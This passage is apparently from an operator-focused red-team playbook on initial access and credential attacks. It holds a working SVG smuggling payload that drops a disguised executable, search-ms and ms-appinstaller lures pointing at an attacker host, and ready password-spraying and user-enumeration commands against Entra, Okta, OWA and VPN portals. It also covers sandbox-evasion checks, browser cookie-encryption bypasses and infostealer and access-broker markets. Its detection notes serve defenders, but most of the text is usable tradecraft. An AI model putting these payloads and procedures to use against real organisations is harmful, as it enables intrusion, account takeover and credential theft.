  - MDE / CrowdStrike / SentinelOne: behavioral rule on signed-binary
    loading unsigned DLL from user-writable path

OPSEC RATING: MEDIUM-HIGH (against legacy EDR); DROPPED to MEDIUM against
  mature 2026 stack (MDE with cloud-delivered protection, CrowdStrike,
  S1). Unsigned DLL loads from user-writable paths are first-class
  detection signals in mature 2026 EDR.
```

### 3.4 — SVG Smuggling

```
═══════════════════════════════════════════════════════════
SVG SMUGGLING — POPULARIZED 2024
MITRE ATT&CK: T1027.006 (HTML Smuggling — adjacent), T1566.001
STEALTH: MEDIUM-HIGH (most email gateways don't deeply inspect SVG)
SUCCESS: MEDIUM
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

MECHANISM:
  SVG (Scalable Vector Graphics) files can contain embedded JavaScript
  via <script> tags. Email gateways traditionally treat SVG as image
  content, not as scripted content. Modern operators embed payload
  delivery logic in SVG <script> tags executed when opened in browser
  or supporting email client.

SAMPLE PATTERN:
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
    <rect width="100%" height="100%" fill="white"/>
    <text x="50%" y="50%" text-anchor="middle">Loading document...</text>
    <script type="application/javascript"><![CDATA[
      // HTML smuggling logic — assemble payload, trigger download
      var b64 = "TVqQAAMAAAA...";
      var raw = atob(b64);
      var arr = new Uint8Array(raw.length);
      for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
      var blob = new Blob([arr], {type:'application/octet-stream'});
      var a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'invoice.pdf.exe';
      document.body.appendChild(a); a.click();
    ]]></script>
  </svg>

DELIVERY:
  - Email attachment with SVG content (extension may be renamed to .svg
    or .html depending on target client)
  - Embedded in HTML email body (some email clients render SVG inline)
  - Linked from phishing page (browser opens SVG → script executes)

DETECTION:
  - Modern email gateway: Defender for Office 365, Proofpoint, Abnormal
    Security inspect SVG content for script tags (catching most simple
    deliveries through 2025-2026)
  - Browser security: SVG-with-script blocked in most modern browsers
    when loaded from email attachment context (varies by client +
    rendering pipeline)

OPSEC RATING: MEDIUM — gateway inspection has improved through 2025;
  obfuscated payloads + uncommon SVG features still bypass some.
```

### 3.5 — search-ms Protocol Abuse

```
═══════════════════════════════════════════════════════════
search-ms PROTOCOL ABUSE — 2024 (revived by FIN7)
MITRE ATT&CK: T1218 (Signed Binary Proxy Execution), T1566.002
STEALTH: HIGH (legitimate Windows protocol — bypasses URL inspection)
SUCCESS: MEDIUM
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

MECHANISM:
  Windows Search supports the `search-ms://` URI scheme to launch
  Explorer-rooted searches. Crafting a malicious `search-ms://` URI
  causes Windows Explorer to display search results pulling from
  attacker-controlled WebDAV / SMB share. Files in those results
  appear as if local — user double-clicks "PDF" → executes payload
  from remote share.

SAMPLE PATTERN:
  search-ms:displayname=Important%20Documents
           &crumb=location:\\attacker.com@SSL\share

  When opened in browser:
  - Windows prompts to open in Windows Explorer
  - Explorer connects to attacker WebDAV share (\\attacker.com@SSL\share)
  - Renders attacker's files as search results
  - User double-clicks "Annual_Report.pdf" → it's actually
    Annual_Report.pdf.lnk pointing to powershell.exe + payload

DELIVERY:
  - HTML email with link: <a href="search-ms://...">Open document</a>
  - Compromised website redirect to search-ms:// URI
  - QR code → search-ms:// URI (mobile users won't trigger; desktop hits
    Explorer)

OBSERVED IN-THE-WILD (Trustwave June 2024 reporting):
  Source: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/search-spoof-abuse-of-windows-search-to-redirect-to-malware/
  - Multiple 2024 phishing campaigns observed using search-ms abuse
  - FIN7-attributed campaigns leveraged search-ms for ScreenConnect
    installer delivery

DETECTION:
  - Sysmon Event ID 1: explorer.exe spawning powershell.exe / payload
    with arguments referencing WebDAV path
  - Network: outbound WebDAV (port 443 to non-corporate destination)
    from user workstation
  - URL filtering: search-ms:// URI in HTTP redirect chains (varies by
    proxy capability)

OPSEC RATING: HIGH at delivery — legitimate Windows protocol; bypasses
  URL reputation. Detection shifts to post-execution behavior.
```

### 3.6 — MSIX Installer Abuse

```
═══════════════════════════════════════════════════════════
MSIX INSTALLER ABUSE
MITRE ATT&CK: T1204.002, T1218
STEALTH: HIGH (signed MSIX bypasses MOTW for elevated execution)
SUCCESS: MEDIUM
SKILL: MEDIUM-HIGH (code-signing requirement)
═══════════════════════════════════════════════════════════

MECHANISM:
  MSIX is Microsoft's modern application packaging format (replacement
  for MSI / ClickOnce). Signed MSIX packages can bypass Mark-of-the-Web
  (MOTW) blocks that prevent macro execution and other "from-internet"
  payload delivery. MSIX also supports ms-appinstaller:// protocol for
  one-click installation from URL.

OBSERVED 2024-2025 PATTERN (multiple actors):
  - Storm-1113 / EvilProxy variants used MSIX-bundled malware for
    initial access
  - Microsoft disabled ms-appinstaller:// protocol by default Feb 2024
    after widespread abuse — re-enabled in selective enterprise
    deployment scenarios; legacy un-patched Windows still vulnerable

DELIVERY:
  - Phishing link → ms-appinstaller://attacker.com/payload.appinstaller
  - User clicks → AppInstaller UI → "Install" button → MSIX deploys
    the embedded payload as a signed app

CODE-SIGNING REQUIREMENT:
  - MSIX requires valid code-signing certificate
  - Operator options:
    1. Stolen / abused signing cert (high legal exposure)
    2. EV cert obtained via shell company front (multi-week setup)
    3. Self-signed (works only if AllowSignatureOriginForUntrustedCertificates
       policy enabled — rare)

DETECTION:
  - Sysmon Event ID 1: AppInstaller.exe / MsiExec.exe with network args
  - Image load anomalies from MSIX-deployed apps in user-writable paths
  - Microsoft Defender ASR rule "Block use of copied or impersonated
    system tools" — partial coverage when applicable

OPSEC RATING: HIGH (when code signing achieved); MEDIUM (without).
  ms-appinstaller://protocol disabled-by-default since Feb 2024
  significantly degrades the one-click delivery path.
```

### 3.7 — Browser Extension Installation as Follow-Up Payload

```
═══════════════════════════════════════════════════════════
BROWSER EXTENSION INSTALLER (POST-PHISHING)
MITRE ATT&CK: T1176 (Browser Extensions — Persistence/Initial Access)
STEALTH: HIGH (signed extension from official Chrome Web Store / Edge
              Add-ons appears legitimate)
SUCCESS: MEDIUM (Chrome Enterprise blocks unmanaged extension install
              in many corp environments)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

MECHANISM:
  Malicious Chrome / Edge / Firefox extension distributed via post-
  phishing installation pretext (fake "security update", "productivity
  tool", "AI assistant"). Once installed:
  - Access to all tab content (every SaaS session, every page user
    visits)
  - Manipulation of cookies, autofill, page DOM
  - Bypasses much of the cookie-extraction defense (App-Bound Encryption)
    by accessing cookies via extension API rather than chrome.dll

OBSERVED 2024-2025 INCIDENTS:
  - Cyberhaven Chrome extension compromise (Dec 2024) — supply chain
    attack on legitimate productivity extension; affected 400k+ orgs;
    attacker injected credential-theft logic into legitimate extension
    via compromised maintainer account
  - Phantom wallet extension impersonation (multiple)
  - Various OAuth-token-stealing extensions in Chrome Web Store /
    Edge Add-ons

DELIVERY VECTORS:
  - Direct phishing link to Chrome Web Store listing for malicious
    extension (operator-uploaded, often impersonating popular tool)
  - Social engineering: "install this VPN extension to access the
    document"
  - Compromised legitimate extension via maintainer account takeover
    (cross-ref §8 supply chain)
  - Side-loaded extension via Chrome Enterprise policy injection
    (requires registry/policy write access on host)

DETECTION:
  - Chrome Enterprise Reporting Connector: unmanaged extension install
    events
  - Defender for Cloud Apps: Cloud Discovery + Shadow IT extension
    monitoring
  - Browser-side: Chrome Enhanced Safe Browsing flags some malicious
    extensions
  - Behavioral: extension making cross-origin requests to non-vendor
    backend

DEFENSES (operator awareness):
  - Chrome Enterprise extension allowlist (`ExtensionInstallAllowlist`
    GPO) — blocks all unlisted extensions
  - Edge: SmartScreen Application Reputation for extension installs
  - Firefox: enterprise policies for extension management

OPSEC RATING: HIGH at install (legitimate Web Store URL; signed
  extension); MEDIUM-LOW once extension behaviorally exfiltrates data.
  Allowlist policy in mature enterprises kills the vector entirely.
```

### 3.8 — Remote-Desktop Tool as Implant

```
═══════════════════════════════════════════════════════════
LEGITIMATE REMOTE-DESKTOP TOOL AS INITIAL-ACCESS IMPLANT
MITRE ATT&CK: T1219 (Remote Access Software), T1566 (Phishing)
STEALTH: HIGH (signed legitimate binary; bypasses payload detection)
SUCCESS: HIGH
SKILL: LOW
═══════════════════════════════════════════════════════════

DOMINANT 2024-2026 FINANCIAL-CRIME PATTERN: Scattered Spider, Akira,
RansomHub, BlackCat-affiliate, BianLian all use legitimate remote-tool
installers as initial-access implant. Bypasses payload-detection layers
because the binary is genuinely signed and legitimate.

COMMON TOOLS USED:
  - ScreenConnect (formerly ConnectWise Control)
  - AnyDesk
  - TeamViewer
  - Splashtop
  - Atera (RMM platform)
  - ConnectWise Automate (RMM)
  - N-able (formerly SolarWinds N-central)
  - RemotePC
  - Chrome Remote Desktop (free, signed by Google)
  - Microsoft Quick Assist (built-in Windows)

DELIVERY MECHANISMS:
  1. VISHING + REMOTE TOOL: attacker poses as IT support, calls target,
     "walks them through" installing remote tool for "troubleshooting".
     Target installs willingly. (Scattered Spider primary pattern.)
  2. PHISHING LINK + INSTALLER: phishing email contains link to
     "support session" — clicks download installer, which auto-connects
     to attacker session.
  3. MICROSOFT QUICK ASSIST ABUSE: built-in Windows tool; attacker
     sends 6-digit access code via vishing; victim enters code → grants
     attacker remote access. NO INSTALLER REQUIRED. Storm-1811 pattern
     observed by Microsoft Threat Intel since May 2024.

CONFIGURATION FOR PERSISTENCE:
  - ScreenConnect: install as system service (survives reboot, runs as
    SYSTEM); attacker-controlled relay server
  - AnyDesk: configure unattended access password for remote re-entry
  - TeamViewer: setup unattended access; pre-configured ID + password
  - Atera / ConnectWise Automate: deploy as managed agent → enroll
    target in attacker's RMM tenant → full management control

DETECTION:
  - EDR: Defender for Endpoint flags ScreenConnect / AnyDesk install
    in non-IT-approved contexts (varies by org policy)
  - Network: outbound to ScreenConnect / AnyDesk relay infrastructure
    (well-known IP ranges)
  - User Activity: install of remote-access tool by non-IT user is
    typically anomalous (compare to baseline employee software)
  - Microsoft Defender XDR: "Suspicious remote access tool installation"
    alert (improved coverage Q4 2024+)
  - CISA + FBI advisory: Stop Ransomware joint advisory documents
    common remote-tool abuse patterns

DEFENSES (operator awareness):
  - AppLocker / WDAC blocking remote-access tool execution by non-IT
    users
  - Network egress block on ScreenConnect / AnyDesk / TeamViewer /
    Splashtop relay infrastructure
  - User awareness training: "we will NEVER ask you to install remote
    access tools by phone"
  - Disable Microsoft Quick Assist for non-admin users (Group Policy)

OPSEC RATING: HIGH (installer is signed legitimate binary; defender's
  EDR doesn't block signed Microsoft / ConnectWise / TeamViewer Inc.
  binaries by default). Defender attention shifts to user-behavior
  anomaly + network-egress patterns.
```

### 3.9 — Sandbox Evasion

```
═══════════════════════════════════════════════════════════
SANDBOX EVASION TECHNIQUES
MITRE ATT&CK: T1497 (Virtualization/Sandbox Evasion)
STEALTH: N/A (this section is about defeating defender analysis)
═══════════════════════════════════════════════════════════

CHECKS BEFORE PAYLOAD EXECUTION (use multiple in combination):
  - TIME-BASED: sleep 300+ seconds → sandbox times out before payload runs
  - USER INTERACTION: require mouse click, scroll, or keypress
  - ENVIRONMENT: check username, domain membership, installed software
  - HARDWARE: check RAM (>4GB), CPU cores (>2), disk size (>60GB)
  - NETWORK: check for internet connectivity, resolve known domains
  - VIRTUALIZATION: check for VM artifacts (VMware tools, VBox additions)
  - LOGIC: don't execute unless within target network IP range
  - TIMING: don't execute outside normal business hours of target tz

These are increasingly ineffective against modern sandboxes (Joe Sandbox,
Hatching Triage, Hybrid Analysis, Defender for Office 365 Detonation
Service all simulate user interaction, accelerate clocks, mimic real
hardware) but still filter basic reputation-stage analysis.

ANTI-ANALYSIS PATTERNS (more advanced):
  - Multi-stage loaders with environmental keying (payload only executes
    if environmental fingerprint matches target)
  - Domain-based key derivation (decryption key derived from target's
    actual domain — sandbox without correct domain context can't decrypt)
  - Late-bound API resolution + hash-based GetProcAddress
  - String obfuscation (no plaintext indicators)
  - Native code primitives (avoid PowerShell / .NET runtime in early stages)
```

```
═══════════════════════════════════════════════════════════
SECTION 3 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §04 Persistence (post-execution persistence mechanisms)
Enables → §05 Privilege Escalation (initial code execution → privesc)
Enables → §07 Defense Evasion (advanced anti-analysis tradecraft)
Cross-ref → §3.8 remote-tool implant = §2.3 vishing follow-on path
Cross-ref → §8 supply chain (browser extension supply chain compromise
            = §3.7 distribution path)
NEVER → Use unmodified Cobalt Strike / Mythic / Sliver default payloads;
        all heavily signatured. Custom loaders required for live ops.
```

---

## 4 — CREDENTIAL ATTACKS

> **Typical chains through this section:** Infostealer log purchase → cred filtering by target domain → MFA-gap discovery via low-and-slow spray → if MFA gap exists, log in directly; if not, pivot to §2.3 help desk vishing. Pure brute-force / fatigue increasingly ineffective against Entra defaults; vector survives in legacy / unmanaged SaaS.

### 4.1 — Infostealer → Access Broker Chain

```
═══════════════════════════════════════════════════════════
INFOSTEALER → ACCESS BROKER PIPELINE — DOMINANT 2024-2026 VECTOR
MITRE ATT&CK: T1078 (Valid Accounts), T1539 (Steal Web Session Cookie),
              T1606.001 (Forge Web Credentials: Web Cookies)
STEALTH: VERY HIGH (legitimate session; no exploit; no phish)
SUCCESS: MED-HIGH (depends on target MFA enforcement)
SKILL: LOW
DETECTION: LOW at sign-in; HIGH on bulk-exfil pattern post-foothold
═══════════════════════════════════════════════════════════

PIPELINE OVERVIEW (Mandiant M-Trends 2025 — stolen credentials = #2
initial access vector at 16%, up from 10% in 2023; overtook email phish):

  1. Subscribe to / purchase from infostealer log markets
  2. Filter logs for credentials matching target organization's domain
  3. Test credentials against target SSO / SaaS / VPN endpoints
  4. If MFA enforced: pivot to help desk vishing (§2.3) OR discard
  5. If MFA NOT enforced: log in directly using legitimate session
  6. Optional: import session cookies into attacker browser → MFA bypass
     by replaying pre-authenticated session

INFOSTEALER MALWARE FAMILIES (credential sources, NOT operator tools):
  - RedLine Stealer — historically largest volume, still active
  - Raccoon Stealer v2 — Tor-based panel
  - Lumma Stealer (LummaC2) — top 2024-2025 volume
  - Vidar — long-lived, still active
  - StealC — rising 2024-2026, modular
  - MetaStealer, Rhadamanthys
  - Atomic Stealer (AMOS) — macOS-targeted
  - ACR Stealer — newer 2024 entrant
  Infection paths: malvertising, SEO poisoning, pirated software, YouTube
  tutorials claiming software activators / game cheats, malicious npm/
  PyPI packages, ClickFix (§2.4).

LOG CONTENTS (what one infostealer log contains):
  - Browser saved passwords (Chrome, Edge, Firefox, Opera — decrypted)
  - Browser session cookies (critically: cookies allow MFA bypass via
    pre-authenticated session replay)
  - Autofill form data (CC numbers, addresses, identity info)
  - Cryptocurrency wallet files
  - Discord / Telegram / Steam sessions
  - VPN / RDP client configurations
  - Saved FTP/SSH credentials (FileZilla, PuTTY, WinSCP)
  - Screenshots of desktop at exfiltration time
  - System inventory (hostname, OS, installed software)

LOG MARKET ECONOMICS (operator awareness):
  - Russian Market (russianmarket[.]to / successors) — subscription log feed
  - Genesis Market — law-enforcement-seized 2023; successors emerged rapidly
  - Telegram channels — "cloud of logs" feeds; free or paid tiers
  - 2besec and similar private communities
  - Pricing: individual logs $5-$50; bulk subscription $100-$2,000/month;
    targeted (specific corporate-domain filter) commands premium pricing
  - M-Trends 2025: 30% of machines in credential logs are enterprise-
    licensed; 46% are unmanaged devices mixing work + personal credentials;
    estimated 94 billion cookies leaked on underground markets in 2024
    (74% YoY increase); 20.5% still active at analysis time

INITIAL ACCESS BROKER (IAB) MARKET DYNAMICS (operator awareness):
  - Forums: exploit.in (Russian), xss.is (Russian), BreachForums (English,
    periodically seized + relaunched), LeakBase, CrackedTo
  - Telegram: rapidly-rotating channels selling pre-validated network access
  - Listing format example (sanitized):
    "Selling access — US — Manufacturing — $2.8B revenue — VPN + Domain
     User — 2,400 hosts — Citrix entry point — $25k starting"
  - Pricing tiers (typical 2025-2026 ranges):
    * Single domain user creds: $50-$500
    * Domain admin / VPN admin: $5,000-$50,000+
    * Enterprise full-DA + Citrix entry: $10,000-$100,000+
    * Top-tier (large corp, named victim, ransomware-quality): $50,000-
      $500,000+ depending on revenue tier and access scope
  - Reputation systems — sellers maintain forum reputation, sometimes
    multi-account; buyers verify access before payment via escrow
  - Aggregation services that monitor (legitimate, paid):
    KELA, Flare, SOCRadar, Cybersixgill, Group-IB, Recorded Future,
    HudsonRock, IntelBroker monitoring

COOKIE / TOKEN REPLAY (the MFA-bypass half of the ecosystem):
  Stealer logs ship with browser session cookies. Importing these
  cookies into attacker's browser via Cookie-Editor extension or
  purpose-built tools (CookieMonster, Donut Cookie Stealer parsers)
  grants pre-authenticated session — Microsoft 365, Salesforce,
  Atlassian, AWS console, etc. — without password or MFA prompt
  (until cookie expires or CAE revokes).

APP-BOUND ENCRYPTION (Chrome 127+, August 2024):
  Source: https://www.elastic.co/security-labs/katz-and-mouse-game
  Chrome 127+ added App-Bound Encryption (ABE) for cookies/passwords.
  Cookies encrypted with key bound to chrome.exe process identity.
  In-process extraction (LSASS-style) doesn't work — the OS prevents
  reading the master key without process context.

  CURRENT OPERATOR BYPASSES (cat-and-mouse documented by Elastic Security
  Labs through 2025):
  1. Memory injection: inject extraction logic into chrome.exe process
     space; bypasses ABE because operating in legitimate context
  2. COM-based bypass: hijack COM server chrome.exe registers; force
     chrome to call out via attacker-controlled COM
  3. DevTools injection: enable remote-debugging on running chrome
     process, query cookies via DevTools Protocol
  4. Direct in-browser via malicious extension (cross-ref §3.7) — ABE
     doesn't apply; extensions have legitimate cookie API access
  5. Steal master key via direct chrome process memory dump (with
     SeDebugPrivilege)

  Tools that have updated for ABE bypass (operator awareness):
  - HackBrowserData (post-Aug-2024 forks)
  - WhiteChocolateMacademiaNut (DevTools-based)
  - Donut-style in-process extractors

CANONICAL EXAMPLE — Snowflake / UNC5537 / ShinyHunters (2024):
  - UNC5537 purchased infostealer logs (some dating back to 2020) with
    credentials for corporate Snowflake tenants
  - Snowflake architecture made MFA an opt-in tenant setting (now
    mandatory after rollout phases April-November 2025)
  - UNC5537 logged in using valid creds — no MFA, no exploit — and
    bulk-exfiltrated customer data
  - Confirmed victims (~165 total per Mandiant): AT&T, Ticketmaster,
    Santander, Advance Auto Parts, Pure Storage, others
  - Public extortion demands; data for sale on BreachForums
  - Snowflake response: mandatory MFA rollout phases:
    * April 2025: enrollment phase begins
    * August 2025: required for new accounts
    * November 2025: full enforcement
    Source: https://www.snowflake.com/en/blog/multi-factor-identification-default/

DETECTION:
  - Sign-in from IP / ASN never previously seen for the user
  - Browser / OS fingerprint mismatch with user's historical pattern
  - Immediate bulk data access or export after sign-in (impossible
    travel + data exfil = high-fidelity combo alert)
  - Session cookie age older than policy (CAE on SharePoint/Exchange/
    Teams revokes outside compliant network in near-real-time)
  - Identity Protection "Unfamiliar sign-in properties" risk signal
  - Defender for Cloud Apps: "Unusual file download" + "Activity from
    infrequent country"
  - KQL detection in §10.6

DEFENSIVE CONTROLS THAT BREAK THIS CHAIN:
  - MFA enforcement on ALL SaaS tenants (not just IdP)
  - Conditional Access: require compliant device for privileged or
    high-value resources
  - Short session token lifetimes + Continuous Access Evaluation
  - Token Protection on native apps (does NOT cover browser cookie replay)
  - Browser credential storage policies (disable browser password manager;
    use enterprise password manager)
  - Endpoint prevention of infostealer execution
  - Stealer-log monitoring services (SpyCloud, Flare, Constella, IntSights,
    HudsonRock) alert when corporate cred appears in a log
```

### 4.2 — Password Spraying

```
═══════════════════════════════════════════════════════════
PASSWORD SPRAYING (T1110.003)
MITRE ATT&CK: T1110.003 (Password Spraying)
STEALTH: MEDIUM (spread to avoid lockout; modern detection still catches)
SUCCESS: LOW vs Entra defaults; MEDIUM vs legacy / unmanaged SaaS
SKILL: LOW
═══════════════════════════════════════════════════════════

LOWER YIELD IN 2026 than 2020-2022 due to MFA + Smart Lockout. Still
useful for: identifying MFA-missing accounts, service accounts that can't
enroll MFA, and as PRECURSOR to help desk vishing (spray gets you the
password; vishing gets past MFA).

AUTHENTICATION STRENGTHS CA POLICY (Entra ID, GA March 2023):
  Source: https://www.microsoft.com/en-us/security/blog/2023/03/30/latest-microsoft-entra-advancements-strengthen-identity-security/
  Modern tenants enforce specific MFA strengths per resource:
  - Phishing-resistant MFA only (FIDO2 / Windows Hello / certificate)
  - Passwordless MFA only (Authenticator passwordless / FIDO2)
  - MFA strength (any MFA method)
  Operator pre-attempt check: probe target tenant's CA policy via
  authentication response codes BEFORE attempting bulk spray.

SPRAY RATE: 1-2 passwords per user per hour to avoid lockout (Smart
Lockout default: 10 failures = 1 minute lockout, escalating).

MODERN PASSWORD PATTERNS TO TEST (replace season+year formula):
  <CompanyName>2026!, <CompanyName>@2026, Welcome2026!, Password123!
  <Location>2026!, <ProductName>2026, <StockTicker>2026
  <CompanyName>!2025, <CompanyName>2025!  (Q1 still uses 2025)
  Also test passwords from RECENT breach data filtered to target's email
  domain — those directly matter, not generic breach database tries.

O365 / ENTRA ID:
  # MSOLSpray (checks Entra ID):
  python3 MSOLSpray.py -u users.txt -p "Spring2026!" -o success.txt

  # Trevorspray (distributed spray with multi-IP):
  trevorspray -u users.txt -p "Spring2026!" --url https://login.microsoftonline.com

  # Spray365 (with timing controls):
  python3 spray365.py spray -u users.txt -p "Spring2026!" --delay 3600

  # nxc (NetExec — formerly CrackMapExec):
  nxc ldap dc01.target.local -u users.txt -p "Spring2026!" --continue-on-success

OWA / EXCHANGE:
  Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList users.txt -Password "Spring2026!"

  # ruler (Go-based Exchange tool):
  ruler --domain target.com brute --users users.txt --passwords passwords.txt

VPN PORTALS:
  hydra -L users.txt -p "Spring2026!" target.com https-form-post \
    "/remote/logincheck:username=^USER^&credential=^PASS^:Invalid"

LEGACY AUTH (where still enabled):
  Modern Entra blocks legacy auth (basic auth IMAP/POP3/SMTP/MAPI/OAB)
  by default since Oct 2022. Some legacy enterprises with explicit
  exceptions still allow it; Smart Lockout doesn't apply to legacy auth.
  Probe via:
    curl -u 'user@target.com:pass' https://outlook.office365.com/EWS/Exchange.asmx

DETECTION:
  - Event ID 4771 (Kerberos pre-auth failed) in bulk
  - Entra ID sign-in logs: Smart Lockout triggers, CA blocks
  - Identity Protection "Password spray" detection (high-fidelity)
  - Defender for Identity (MDI) "Suspected brute force attack" alert
  - KQL hunt in §10.6

OPSEC: Spread across time + multiple source IPs; respect lockout
  thresholds. Check policy FIRST: nxc smb dc01 -u user -p pass --pass-pol
  Against Entra: distributed spray from residential proxies still gets
  signal from Identity Protection's aggregate pattern detection.
```

### 4.3 — MFA Fatigue / Push Bombing

```
═══════════════════════════════════════════════════════════
MFA FATIGUE / PUSH BOMBING (T1621)
MITRE ATT&CK: T1621 (Multi-Factor Authentication Request Generation)
STEALTH: LOW vs Entra defaults; MEDIUM vs other vendors
SUCCESS: LOW (against Microsoft Authenticator number-matching);
         MEDIUM (against legacy push apps without number matching)
SKILL: LOW
═══════════════════════════════════════════════════════════

CURRENT STATE (2026):
  - Microsoft Authenticator: number matching ENABLED BY DEFAULT since
    27 February 2023.
    Source: https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-default-enablement
    User must type 2-digit number shown on sign-in screen into the app
    — blind "accept" does NOT authenticate. Push bombing alone no
    longer works against default-configured tenants.
  - Duo, Okta Verify, and other TOTP/push MFA apps: number matching
    is configurable but NOT universally enabled; legacy push-accept
    still common.
  - Legacy mobile authenticator apps (older RSA SecurID, some banking
    apps): push-only accept still prevalent.

OPERATIONAL IMPLICATION:
  - Against Entra with number matching on: push bombing FAILS as
    standalone technique. Pivot to help desk vishing (§2.3).
  - Against Okta / Duo tenants where number matching is OFF: still
    effective.
  - Hybrid approach: push bomb + pretext social engineering call during
    spam ("hi, this is IT, we're testing a new auth system, please
    approve the MFA so we can complete the test") still works on
    unsophisticated targets.

DETECTION:
  - High volume of MFA prompts for single user within short window
  - Unusual MFA approval source IP vs sign-in context
  - Identity Protection "MFA fatigue" detection (Q4 2024+)
  - Defender for Identity: "Suspicious MFA prompt patterns"

OPSEC RATING: LOW against default-configured Entra (number matching
  blocks); MEDIUM against non-Microsoft tenants without number matching.
```

### 4.4 — User Enumeration

```
═══════════════════════════════════════════════════════════
USER ENUMERATION (PRE-SPRAY INTELLIGENCE)
MITRE ATT&CK: T1589.002 (Email Addresses), T1589.003 (Employee Names)
STEALTH: MEDIUM (some endpoints don't lockout; logging varies)
═══════════════════════════════════════════════════════════

O365 / ENTRA ID USER ENUMERATION:
  # o365enum — check email existence
  python3 o365enum.py -u emails.txt -m office

  # Azure AD autologon endpoint (no lockout; logging varies — invalid
  # usernames may not appear in sign-in logs, but failed sign-ins for
  # valid users may still be logged. Do not treat as fully invisible)
  POST https://autologon.microsoftazuread-sso.com/winauth/trust/2005/usernamemixed

  # Response differs for valid vs invalid users
  # Tools: o365creeper, MSOLSpray (also enumerates), MailSniper

  # TeamFiltration (Flangvik — v3.5.5 April 2025, actively maintained):
  # https://github.com/Flangvik/TeamFiltration
  # Full O365 attack suite: enumerate + spray + exfil
  TeamFiltration --outpath teamfilter --enumerate --emails emails.txt

OKTA USER ENUMERATION:
  curl -s "https://target.okta.com/api/v1/authn" \
       -H "Content-Type: application/json" \
       -d '{"username":"user@target.com","password":"InvalidProbeXyz"}'
  # Response codes differ for existent vs non-existent user

AUTH0 / OTHER OAUTH IdP:
  Similar pattern — POST to auth endpoint, observe response delta

LINKEDIN → EMAIL FORMAT DERIVATION (cross-ref passive recon §4.3):
  - Tools: linkedin2username, CrossLinked (covered §4 of passive recon)
  - first.last@target.com, flast@target.com, etc.
  - Hunter.io domain-search returns inferred format pattern directly

OPSEC: Identity Protection's aggregate detection catches enumeration
  patterns even when individual probes don't fire alerts. Distribute
  across IPs + introduce timing jitter.
```

```
═══════════════════════════════════════════════════════════
SECTION 4 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §6 external remote services (creds → VPN/RDP/SSH)
Enables → §7 cloud (creds + cookies → cloud-API access)
Enables → §2.3 help desk vishing (creds + MFA-gap pivot)
Prereq → Passive recon §4 (employee inventory) + §6 (breach/stealer)
Cross-ref → §2 phishing (alternative path when no breach data exists)
Cross-ref → §10.6 KQL hunting queries
```

---

## 5 — EXPLOIT PUBLIC-FACING APPLICATION

> **Typical chains through this section:** Identify edge appliance / web app via passive recon → match version against current CVE matrix → exploit pre-auth RCE → shell on appliance (no EDR) → extract internal credentials → pivot to AD / cloud. Edge devices are #1 initial-access target for nation-state actors per M-Trends 2025 (5th consecutive year).

### 5.1 — Vulnerability Scanning

```
═══════════════════════════════════════════════════════════
VULNERABILITY SCANNING — TARGETED, NOT BROAD
MITRE ATT&CK: T1595.002 (Active Scanning: Vulnerability Scanning)
STEALTH: MEDIUM (per-target Nuclei) to HIGH NOISE (broad scanner)
═══════════════════════════════════════════════════════════

Cross-reference active recon §8 (Nuclei v3, Nmap NSE, commercial scanners)
for full vulnerability scanning tradecraft. Initial-access focus is
EXPLOIT-AVAILABILITY-CHECK, not blind scanning.

# Nuclei v3 — template-based, severity-tagged
nuclei -u https://target.com -t cves/ -severity critical,high -silent
nuclei -u https://target.com -t exposures/ -t misconfigurations/
nuclei -l urls.txt -t technologies/ -t cves/ -t default-logins/ -rate-limit 50

# Per-edge-vendor (cross-ref §4.8 active recon CVE matrix)
nuclei -u https://target.com -tags ivanti,fortinet,citrix,paloalto,f5
nuclei -u https://target.com -tags veeam,vcenter,exchange,confluence,jenkins
nuclei -u https://target.com -tags screenconnect,manageengine

# Nmap NSE
nmap -sV --script=http-vuln*,http-enum,http-default-accounts \
     -p 80,443,8080,8443 target.com

# Nikto (legacy but still useful for aging web infra)
nikto -h https://target.com -Tuning x 6

# Exploit availability
searchsploit <product> <version>
vulncheck-kev --search-cve CVE-2025-XXXXX

# CISA KEV catalog (operator daily reading):
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" | jq
```

### 5.2 — Edge Device CVE Matrix (Q1-Q2 2026)

```
═══════════════════════════════════════════════════════════
EDGE-APPLIANCE CVE QUICK-RECOGNITION MATRIX (extends §4.8 active recon)
═══════════════════════════════════════════════════════════
Status legend:
  🔥 ACTIVE EXPLOITATION    — observed in-the-wild Q1-Q2 2026
  ✅ PATCHED + DECLINING    — vendor patches available; declining ITW
  📋 KEV-LISTED             — CISA Known Exploited Vulnerabilities

VENDOR / PRODUCT          | CVE              | TYPE              | STATUS
──────────────────────────┼──────────────────┼───────────────────┼────────
Ivanti Connect Secure     | CVE-2024-21887   | Cmd injection     | 🔥📋
Ivanti Connect Secure     | CVE-2023-46805   | Auth bypass       | 🔥📋
Ivanti Connect Secure     | CVE-2024-21888   | Privesc           | ✅
Ivanti Connect Secure     | CVE-2024-21893   | SSRF              | ✅
Ivanti Connect Secure     | CVE-2025-0282    | Stack BO RCE      | 🔥📋
Ivanti Connect Secure     | CVE-2025-22457   | Stack BO RCE      | 🔥📋
                                                                 (UNC5221)
Ivanti CSA                | CVE-2024-8963    | Admin bypass      | ✅📋
Ivanti CSA                | CVE-2024-8190    | RCE               | ✅📋
Fortinet FortiGate SSL VPN| CVE-2024-21762   | OOB RCE (SSLVPNd) | 🔥📋
Fortinet FortiManager     | CVE-2024-47575   | Auth bypass + RCE | 🔥📋
Fortinet FortiOS          | CVE-2023-27997   | Heap overflow RCE | ✅📋
Fortinet FortiOS          | CVE-2022-42475   | Heap overflow RCE | ✅📋
Fortinet FortiClient EMS  | CVE-2023-48788   | SQL injection RCE | 🔥📋
                                                                 (FIN8 ransom)
Citrix NetScaler          | CVE-2023-4966    | Citrix Bleed      | ✅📋
Citrix NetScaler          | CVE-2023-3519    | Pre-auth RCE      | ✅📋
